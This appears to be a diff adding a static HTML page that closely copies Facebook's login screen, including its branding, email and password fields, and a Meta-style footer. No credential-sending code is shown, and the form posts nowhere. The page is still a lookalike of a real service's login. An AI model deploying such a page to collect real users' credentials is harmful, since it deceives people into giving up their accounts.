@@ -1,0 +1,234 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Facebook Login</title>
+    <script src="fblogin.js" defer></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body {
+        background: #f0f2f5;
+      }
+
+      .container {
+        text-align: center;
+        margin-top: 25px;
+      }
+
+      .logo {
+        color: #1877f2;
+        font-size: 48px;
+        font-weight: bold;
+      }
+
+      .card {
+        width: 396px;
+        background: white;
+        margin: 25px auto;
+        padding: 20px 16px;
+        border-radius: 8px;
+        box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.15);
+      }
+
+      /* Input fields */
+      input {
+        width: 100%;
+        height: 50px;
+        margin: 8px 0;
+        padding-left: 12px;
+        border-radius: 6px;
+        border: 1px solid #dddfe2;
+        font-size: 16px;
+      }
+      input.invalid {
+        border-color: #d93025;
+      }
+
+      .error-text {
+        color: #d93025;
+        font-size: 12px;
+        line-height: 1.2;
+        min-height: 14px;
+        margin: 2px 0 6px;
+        text-align: left;
+        display: block;
+        padding-left: 4px;
+      }
+
+      button {
+        width: 100%;
+        height: 48px;
+        background: #1877f2;
+        color: white;
+        font-size: 18px;
+        font-weight: bold;
+        border: none;
+        border-radius: 6px;
+        margin-top: 12px;
+        cursor: pointer;
+      }
+
+      /* ---- LINKS UNDER BUTTON ---- */
+
+      .links {
+        margin-top: 16px;
+        text-align: center;
+        font-size: 14px;
+      }
+
+      .links a {
+        text-decoration: none;
+        color: #1877f2;
+        font-weight: 500;
+      }
+
+      .dot {
+        color: #65676b;
+        margin: 0 6px;
+      }
+
+      /* ---------- FACEBOOK-LIKE FOOTER ---------- */
+
+      footer {
+        background: white;
+        width: 100%;
+        margin-top: 80px;
+      }
+
+      .footer {
+        width: 980px;
+        margin: 0 auto;
+        padding: 167px 0 20px 0;
+        font-size: 12px;
+        color: #737373;
+      }
+
+      /* Top language row */
+      .footer_top a {
+        text-decoration: none;
+        color: #737373;
+        margin-right: 10px;
+      }
+
+      /* Thin grey line */
+      .footer-hr {
+        border: none;
+        border-top: 1px solid #dddfe2;
+        margin: 10px 0;
+      }
+
+      /* Bottom links */
+      .footer_bottom {
+        line-height: 1.6;
+      }
+
+      .footer_bottom a {
+        text-decoration: none;
+        color: #737373;
+        margin-right: 12px;
+      }
+
+      /* Meta copyright text */
+      .copyright {
+        margin-top: 10px;
+        color: #737373;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="logo">facebook</div>
+
+      <div class="card">
+        <h2>Log in to Facebook</h2>
+
+        <form id="login-form" action="#" method="post" novalidate>
+          <input
+            type="text"
+            id="login_contact"
+            name="login_contact"
+            placeholder="Email address or phone number"
+            required
+          />
+          <span class="error-text" data-for="login_contact"></span>
+
+          <input
+            type="password"
+            id="login_password"
+            name="login_password"
+            placeholder="Password"
+            required
+          />
+          <span class="error-text" data-for="login_password"></span>
+
+          <button type="submit">Log in</button>
+        </form>
+
+        <div class="links">
+          <a href="#">Forgotten account?</a>
+          <span class="dot">·</span>
+          <a href="./face.html">Sign up for Facebook</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- -------- FOOTER START -------- -->
+    <footer>
+      <div class="footer">
+        <p class="footer_top">
+          English (UK)
+          <a href="#">ಕನ್ನಡ</a>
+          <a href="#">اردو</a>
+          <a href="#">मराठी</a>
+          <a href="#">తెలుగు</a>
+          <a href="#">हिन्दी</a>
+          <a href="#">தமிழ்</a>
+          <a href="#">മലയാളം</a>
+          <a href="#">বাংলা</a>
+          <a href="#">ગુજરાતી</a>
+          <a href="#">ਪੰਜਾਬੀ</a>
+        </p>
+
+        <hr class="footer-hr" />
+
+        <p class="footer_bottom">
+          <a href="#">Sign Up</a>
+          <a href="#">Log In</a>
+          <a href="#">Messenger</a>
+          <a href="#">Facebook Lite</a>
+          <a href="#">Video</a>
+          <a href="#">Meta Pay</a>
+          <a href="#">Meta Store</a>
+          <a href="#">Meta Quest</a>
+          <a href="#">Ray-Ban Meta</a>
+          <a href="#">Meta AI</a>
+          <a href="#">Meta AI more content</a>
+          <a href="#">Instagram</a>
+          <a href="#">Threads</a>
+          <a href="#">Voting Information Centre</a>
+          <a href="#">Privacy Policy</a>
+          <a href="#">Privacy Centre</a>
+          <a href="#">About</a>
+          <a href="#">Create ad</a>
+          <a href="#">Create Page</a>
+          <a href="#">Developers</a>
+          <a href="#">Careers</a>
+          <a href="#">Cookies</a>
+          <a href="#">AdChoices</a>
+          <a href="#">Terms</a>
+          <a href="#">Help</a>
+          <a href="#">Contact uploading and non-users</a>
+        </p>
+
+        <p class="copyright">Meta © 2026</p>
+      </div>
+    </footer>
+  </body>
+</html>
